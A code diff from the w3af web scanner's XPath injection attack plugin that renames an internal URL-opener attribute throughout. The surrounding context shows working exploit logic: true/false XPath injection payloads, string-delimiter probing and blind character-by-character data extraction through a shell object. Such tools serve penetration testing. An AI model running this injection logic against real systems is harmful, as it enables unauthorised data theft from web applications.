@@ -115,7 +115,7 @@ class xpath(baseAttackPlugin):
             
             # Create the shell object
             shell_obj = xpath_reader( vuln )
-            shell_obj.setUrlOpener( self._urlOpener )
+            shell_obj.setUrlOpener( self._uri_opener )
             shell_obj.STR_DEL = self.STR_DEL
             shell_obj.TRUE_COND = self.TRUE_COND
             shell_obj.FALSE_COND = self.FALSE_COND
@@ -153,7 +153,7 @@ class xpath(baseAttackPlugin):
                                                     self.STR_DEL, self.rnum + 1)
         
         exploit_dc = vuln.getDc()
-        functionReference = getattr( self._urlOpener , vuln.getMethod() )
+        functionReference = getattr( self._uri_opener , vuln.getMethod() )
         exploit_dc[ vuln.getVar() ] = self.FALSE_COND
 
         #
@@ -165,7 +165,7 @@ class xpath(baseAttackPlugin):
         except w3afException, e:
             return 'Error "' + str(e) + '"'
         else:
-            if not response_is_error(vuln, false_resp.getBody(), self._urlOpener, self.use_difflib):  
+            if not response_is_error(vuln, false_resp.getBody(), self._uri_opener, self.use_difflib):  
                 om.out.debug( "ERROR: Error message not found in FALSE response..." )
                 return False
             else:
@@ -183,7 +183,7 @@ class xpath(baseAttackPlugin):
                 om.out.debug( 'Error "%s"' % (e) )
                 return None
             else:              
-                if response_is_error(vuln, true_resp.getBody(), self._urlOpener, self.use_difflib):
+                if response_is_error(vuln, true_resp.getBody(), self._uri_opener, self.use_difflib):
                     print true_resp.getBody()
                     om.out.debug( "ERROR: Error message found in TRUE response..." )
                     return False
@@ -198,7 +198,7 @@ class xpath(baseAttackPlugin):
         '''
         exploit_dc = vuln.getDc()
         orig_value = vuln.getMutant().getOriginalValue()
-        functionReference = getattr( self._urlOpener , vuln.getMethod() )
+        functionReference = getattr( self._uri_opener , vuln.getMethod() )
         
         true_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum)
         false_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum + 1) 
@@ -213,7 +213,7 @@ class xpath(baseAttackPlugin):
             om.out.debug( 'Error "%s"' % (e) )
             return None
         else:
-            if response_is_error(vuln, sq_resp.getBody(), self._urlOpener, self.use_difflib):
+            if response_is_error(vuln, sq_resp.getBody(), self._uri_opener, self.use_difflib):
                 # If we found ERROR with TRUE Query, we have a problem!
                 om.out.debug( 'Single quote TRUE test failed, testing double quote' )
                 exploit_dc[ vuln.getVar() ] = true_dq
@@ -223,7 +223,7 @@ class xpath(baseAttackPlugin):
                     om.out.debug( 'Error "%s"' % (e) )
                     return None
                 else:
-                    if response_is_error(vuln, dq_resp.getBody(), self._urlOpener, self.use_difflib):
+                    if response_is_error(vuln, dq_resp.getBody(), self._uri_opener, self.use_difflib):
                         # If we found an error HERE, the TWO tests were ERROR, 
                         # Houston we have a BIG PROBLEM! 
                         om.out.debug( 'The TWO string delimiter tests failed, stopping.' )
@@ -240,7 +240,7 @@ class xpath(baseAttackPlugin):
                     om.out.debug( 'Error "%s"' % (e) )
                     return None
                 else:
-                    if response_is_error(vuln, sq_resp.getBody(), self._urlOpener, self.use_difflib):
+                    if response_is_error(vuln, sq_resp.getBody(), self._uri_opener, self.use_difflib):
                         om.out.debug( 'String delimiter FOUND, it is (\')!' )
                         return "'"
                     else:
@@ -259,7 +259,7 @@ class xpath(baseAttackPlugin):
         diffRatio = 0.0
         
         exploit_dc = vuln.getDc()
-        functionReference = getattr( self._urlOpener , vuln.getMethod() )
+        functionReference = getattr( self._uri_opener , vuln.getMethod() )
         exploit_dc[ vuln.getVar() ] = vuln.getMutant().getOriginalValue()
 
         om.out.debug( "Testing if body dynamically changes... " )
@@ -367,7 +367,7 @@ class xpath_reader(shell):
         XML is too long. In the case of an error, None is returned.
         '''
         exploit_dc = self.getDc()
-        functionReference = getattr( self._urlOpener , self.getMethod() )
+        functionReference = getattr( self._uri_opener , self.getMethod() )
 
         maxl = self.max_data_len
         minl = 1
@@ -394,7 +394,7 @@ class xpath_reader(shell):
             except w3afException, e:
                 om.out.debug( 'Error "%s"' % (e) )
             else:
-                if response_is_error(self, lresp.getBody(), self._urlOpener, self.use_difflib):
+                if response_is_error(self, lresp.getBody(), self._uri_opener, self.use_difflib):
                     # We found the length!
                     fdata_len = True
                     om.out.debug('Response Length FOUND!: %i ' % (mid) )
@@ -414,7 +414,7 @@ class xpath_reader(shell):
                         return None
                     else:
                         if not response_is_error(self, lresp.getBody(), 
-                                                 self._urlOpener,
+                                                 self._uri_opener,
                                                  self.use_difflib):
                             # LENGTH IS < THAN MID
                             maxl = mid
@@ -430,7 +430,7 @@ class xpath_reader(shell):
         HTTP library exceptions are not handled in order to make the code clearer. 
         '''
         exploit_dc = self.getDc()
-        functionReference = getattr( self._urlOpener , self.getMethod() )
+        functionReference = getattr( self._uri_opener , self.getMethod() )
 
         data = ''
         
@@ -449,7 +449,7 @@ class xpath_reader(shell):
                 exploit_dc[ self.getVar() ] = dataq
                 dresp = functionReference( self.getURL(), str(exploit_dc) )
                 
-                if not response_is_error(self, dresp.getBody(), self._urlOpener, self.use_difflib):
+                if not response_is_error(self, dresp.getBody(), self._uri_opener, self.use_difflib):
                     om.out.console('Character found: "%s"' % hexcar )
                     data += hexcar
                     break
